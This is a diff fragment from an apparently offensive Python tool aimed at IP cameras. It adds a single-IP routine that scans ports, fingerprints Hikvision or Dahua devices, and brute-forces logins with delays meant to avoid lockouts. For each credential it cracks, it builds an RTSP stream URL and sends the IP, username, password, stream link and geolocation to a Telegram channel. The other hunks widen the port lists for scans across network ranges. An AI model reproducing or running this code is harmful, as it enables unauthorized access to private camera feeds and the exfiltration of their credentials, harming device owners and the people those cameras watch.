+                                                           9000, 37777, 37778, 37779]]
+            if _sb_cam_ports and _sb_port not in _sb_open:
+                _sb_port = _sb_cam_ports[0]
+                print(f"  {Y30}[→] Switching to detected HTTP port: {_sb_port}{W30}")
+
+            # ── Step 2: RTSP port auto-detection ──────────────────────────────
+            print(f"{C30}[2/4] RTSP port probe ...{W30}", end='', flush=True)
+            _sb_rtsp_cands = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+            _sb_rtsp_port = next((p for p in _sb_open if p in _sb_rtsp_cands), None)
+            if not _sb_rtsp_port:
+                for _sb_cp in _sb_rtsp_cands:
+                    try:
+                        _sb_ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        _sb_ts.settimeout(0.4)
+                        if _sb_ts.connect_ex((_sb_ip, _sb_cp)) == 0:
+                            _sb_rtsp_port = _sb_cp
+                            _sb_ts.close()
+                            break
+                        _sb_ts.close()
+                    except Exception:
+                        pass
+            _sb_rtsp_port = _sb_rtsp_port or 554
+            _rtsp_note = '' if _sb_rtsp_port == 554 else f'  {Y30}(non-standard: {_sb_rtsp_port}){W30}'
+            print(f" {G30}port {_sb_rtsp_port}{W30}{_rtsp_note}")
+
+            # ── Step 3: Camera type detection ─────────────────────────────────
+            print(f"{C30}[3/4] Camera detection ...{W30}", end='', flush=True)
+            _sb_found, _sb_type = detect_camera_via_http(_sb_ip, _sb_port)
+            if not _sb_found:
+                # Dahua SDK ports are a definitive signal
+                if _sb_port in (37777, 37778, 37779) or \
+                        any(p in _sb_open for p in (37777, 37778, 37779)):
+                    _sb_type = "Anjhua-Dahua Technology Camera"
+                    _sb_found = True
+                else:
+                    _sb_type = "Unknown Camera"
+            print(f" {G30}{_sb_type}{W30}")
+
+            # ── Step 4: Credential brute-force ────────────────────────────────
+            print(f"{C30}[4/4] Loading credentials ...{W30}", end='', flush=True)
+            _sb_creds = load_credentials()
+            print(f" {G30}{len(_sb_creds)} pairs{W30}")
+            print(f"  {Y30}Trying {len(_sb_creds)} credentials against "
+                  f"{_sb_ip}:{_sb_port} ...{W30}\n")
+
+            _sb_is_dahua = (
+                "Dahua" in _sb_type or "Anjhua" in _sb_type
+                or _sb_port in (37777, 37778, 37779)
+                or any(p in _sb_open for p in (37777, 37778, 37779))
+            )
+            _sb_hits = []
+            _sb_fail_streak = 0
+
+            try:
+                for _sb_u, _sb_pw in _sb_creds:
+                    try:
+                        if _sb_is_dahua:
+                            _sbv = DahuaCameraValidator(_sb_ip, _sb_u, _sb_pw, _sb_port)
+                            _sbv.timeout = 1.5
+                            _sb_ok, _ = _sbv.validate()
+                        else:
+                            _sbv = HikvisionCameraValidator(_sb_ip, _sb_u, _sb_pw, _sb_port)
+                            _sbv.timeout = 1.5
+                            _sb_ok, _ = _sbv.validate()
+
+                        if _sb_ok:
+                            _sb_fail_streak = 0
+                            _sb_rtsp_url = find_working_rtsp_url(
+                                _sb_ip, _sb_u, _sb_pw, _sb_type, _sb_rtsp_port)
+                            _sb_rtsp_url = (_sb_rtsp_url or
+                                            f"rtsp://{_sb_u}:{_sb_pw}@{_sb_ip}:{_sb_rtsp_port}")
+                            _sb_hits.append((_sb_u, _sb_pw, _sb_rtsp_url))
+                            print(f"\n  {G30}[✓] HIT  {_sb_u}:{_sb_pw}  →  {_sb_rtsp_url}{W30}")
+                            # Telegram alert
+                            if TELEGRAM_CONFIG.get("enabled"):
+                                _sb_geo = get_geographic_location(_sb_ip)
+                                _sb_loc = (f"{_sb_geo.get('city', '')}, "
+                                           f"{_sb_geo.get('regionName', '')}, "
+                                           f"{_sb_geo.get('country', '')}")
+                                send_telegram_message(
+                                    f"🎯 <b>Single IP Brute Force — Credential Found!</b>\n"
+                                    f"📍 <code>{_sb_ip}:{_sb_port}</code>\n"
+                                    f"📷 Type : {_sb_type}\n"
+                                    f"👤 User : <code>{_sb_u}</code>\n"
+                                    f"🔑 Pass : <code>{_sb_pw}</code>\n"
+                                    f"🌐 Web  : <code>http://{_sb_ip}:{_sb_port}</code>\n"
+                                    f"📡 RTSP : <code>{_sb_rtsp_url}</code>\n"
+                                    f"📌 Loc  : {_sb_loc}"
+                                )
+                        else:
+                            _sb_fail_streak += 1
+                            print(f"  {R30}✗{W30} {_sb_u}:{_sb_pw}   ", end='\r', flush=True)
+                            # Smart Lockout Protection
+                            if _sb_fail_streak >= 3:
+                                time.sleep(5)
+                                _sb_fail_streak = 0
+                    except Exception:
+                        continue
+            except (EOFError, KeyboardInterrupt):
+                print(f"\n  {Y30}[!] Brute force interrupted.{W30}")
+
+            print()
+            if _sb_hits:
+                print(f"\n{G30}{'═'*58}{W30}")
+                print(f"  {G30}[✓] {len(_sb_hits)} credential(s) found for {_sb_ip}:{_sb_port}{W30}")
+                for _h_u, _h_pw, _h_r in _sb_hits:
+                    print(f"    {Y30}{_h_u}:{_h_pw}{W30}  →  {_h_r}")
+                print(f"{G30}{'═'*58}{W30}")
+            else:
+                print(f"  {Y30}[!] No valid credentials found for {_sb_ip}:{_sb_port}.{W30}")
+            if _tools_wait_back():
+                continue
+
         else:
             print(f"{R}[!] Invalid choice.{W}")
 
@@ -15867,7 +16138,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             sys.exit(1)
 
         # Full camera port set
-        _PS_PORTS   = [80, 443, 554, 8000, 8080, 8081, 8443, 8888, 9000, 34567, 37777]
+        _PS_PORTS   = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         _PS_TIMEOUT = 1.5
         _PS_WORKERS = 200
 
@@ -18599,7 +18870,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
         _fca_target   = sys.argv[_fca_idx + 1]
         _fca_timeout  = 1.0
         _fca_threads  = 200
-        _fca_ports    = [80, 554, 8080, 8554, 37777, 34567, 5000, 8000]
+        _fca_ports    = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         if '--timeout' in sys.argv:
             try: _fca_timeout = float(sys.argv[sys.argv.index('--timeout') + 1])
             except: pass
@@ -20576,7 +20847,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             print(f"{R}[!] Invalid CIDR: {_sr_cidr}  ({_srve}){W}")
             sys.exit(1)
         _sr_ips   = [str(h) for h in _sr_net.hosts()]
-        _sr_ports = [80, 443, 554, 37777, 8000, 8080, 8554, 34567]
+        _sr_ports = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         _sr_workers = 150
         if '--threads' in sys.argv:
             try:
@@ -20675,7 +20946,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
         except ValueError as _srhe:
             print(f"{R}[!] Invalid CIDR: {_srh_cidr}  ({_srhe}){W}"); sys.exit(1)
         _srh_ips     = [str(h) for h in _srh_net.hosts()]
-        _srh_ports   = [80, 443, 554, 37777, 8000, 8080, 8554, 34567]
+        _srh_ports   = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         _srh_workers = 150
         if '--threads' in sys.argv:
             try:
@@ -21299,7 +21570,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
 
         # 1. Port scan
         _rep(f"\n[1/5] Port Scan", C)
-        _rep_probe_ports = [80, 443, 554, 37777, 8000, 8080, 8554, 34567, 3000]
+        _rep_probe_ports = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         _open = fast_port_scan(_rep_ip, _rep_probe_ports, timeout=1.0)
         if _open:
             _rep(f"  Open ports : {', '.join(str(p) for p in _open)}", G)
@@ -21577,7 +21848,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                 return res
             # 1 ports
             res['open'] = fast_port_scan(
-                ip, [80, 443, 554, 37777, 8000, 8080, 8554, 34567, 3000],
+                ip, [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779],
                 timeout=1.0)
             # 2 type
             _bcf, _bct = detect_camera_via_http(ip, port)
@@ -22010,7 +22281,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             if not ip: return res
             # 1 port scan
             res['open'] = fast_port_scan(
-                ip, [80, 443, 554, 37777, 8000, 8080, 8554, 34567, 3000],
+                ip, [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779],
                 timeout=1.0)
             # 2 type detect
             _acf, _act = detect_camera_via_http(ip, port)
@@ -22307,7 +22578,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
         print(f"{C}{'═'*70}{W}")
         # Stage 1: port scan
         print(f"  {C}[1/5] Port scan ...{W}", end='', flush=True)
-        _rh_probe_ports = [80, 443, 554, 37777, 8000, 8080, 8554, 34567, 3000]
+        _rh_probe_ports = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         _rh_open = fast_port_scan(_rh_ip, _rh_probe_ports, timeout=1.0)
         print(f" {G}done{W}")
         # Stage 2: camera type
@@ -24921,7 +25192,7 @@ if (CAMERAS.length > 0) {{
         metavar='PORT',
         type=int,
         default=None,
-        help='Scan only this port instead of the default list [80,8080,8000,37777] (e.g. --port 8554)'
+        help='Scan only this port instead of the expanded default list (e.g. --port 8554)'
     )
     _parser.add_argument(
         '--brute-only',
@@ -25179,18 +25450,17 @@ if (CAMERAS.length > 0) {{
     # ── Apply --port-profile (translate name → port list) ────────────────────
     if _args.port_profile:
         _PORT_PROFILES = {
-            'hikvision': [80, 8080, 8000, 443, 554],
-            'dahua':     [80, 8080, 37777, 443, 554],
-            'axis':      [80, 443, 554],
-            'foscam':    [80, 88, 443, 554],
-            'reolink':   [80, 443, 554, 9000],
-            'uniview':   [80, 443, 554, 6060],
-            'hanwha':    [80, 8080, 443, 4520, 554],
-            'common':    [80, 8080, 8000, 37777, 443, 554],
-            'rtsp':      [554, 8554, 10554],
-            'http':      [80, 8080, 8000, 8888, 443, 8443],
-            'all':       [80, 8080, 8000, 8443, 37777, 34567, 443,
-                          9527, 554, 88, 9000, 7001, 10001, 8888, 6060],
+            'hikvision': [80, 8080, 8000, 443, 554, 8443, 8554],
+            'dahua':     [80, 8080, 37777, 37778, 37779, 443, 554, 8554],
+            'axis':      [80, 443, 554, 8080, 8554],
+            'foscam':    [80, 88, 443, 554, 8554],
+            'reolink':   [80, 443, 554, 9000, 8554],
+            'uniview':   [80, 443, 554, 6060, 8554],
+            'hanwha':    [80, 8080, 443, 4520, 554, 8554],
+            'common':    [80, 443, 554, 1050, 3000, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 34567, 37777, 37778, 37779],
+            'rtsp':      [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779],
+            'http':      [80, 443, 1025, 1050, 3000, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8888, 9000],
+            'all':       [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779],
         }
         _ppname = _args.port_profile.lower().strip()
         if _ppname not in _PORT_PROFILES:
@@ -25289,7 +25559,7 @@ if (CAMERAS.length > 0) {{
         print(f"  {Y}Country     {W}: {_dr_cstr}")
 
         # Ports
-        _dr_ports = _cli_port_override if _cli_port_override else [80, 8080, 8000, 37777]
+        _dr_ports = _cli_port_override if _cli_port_override else [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]
         print(f"  {Y}Ports       {W}: {', '.join(str(p) for p in _dr_ports)}")
 
         # Threads
